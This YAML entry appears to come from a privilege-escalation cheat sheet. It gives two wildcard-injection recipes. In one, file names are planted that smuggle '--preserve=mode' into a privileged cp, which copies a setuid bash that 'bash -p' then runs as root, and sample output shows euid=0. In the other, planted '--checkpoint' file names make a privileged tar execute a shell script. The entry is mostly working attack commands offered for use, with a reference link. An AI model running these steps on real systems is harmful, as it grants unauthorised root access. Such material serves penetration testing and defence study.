---
functions:
  privilege-escalation:
    - description: Cp Wildcard Escape
      code: |
        Goal: inject to run the following: cp --preserve=mode bash [dest]
        echo "" > '--preserve=mode'
        cp /bin/bash .
        chmod 7777 bash
        
        run file: /etc/bind/named.bindmgr/bash -p

        bash-5.0# id
        uid=1001(bindmgr) gid=1001(bindmgr) euid=0(root) egid=117(bind) groups=117(bind),1001(bindmgr)

    - description: Tar Wildcard Escape
      code: |
        Goal: inject to run the following: tar --checkpoint=1 --checkpoint-action=exec=sh shell.sh  (run shell.sh after archiving)

        touch "--checkpoint=1"
        touch "--checkpoint-action=exec=sh shell.sh"

resources: |
  https://www.exploit-db.com/papers/33930
---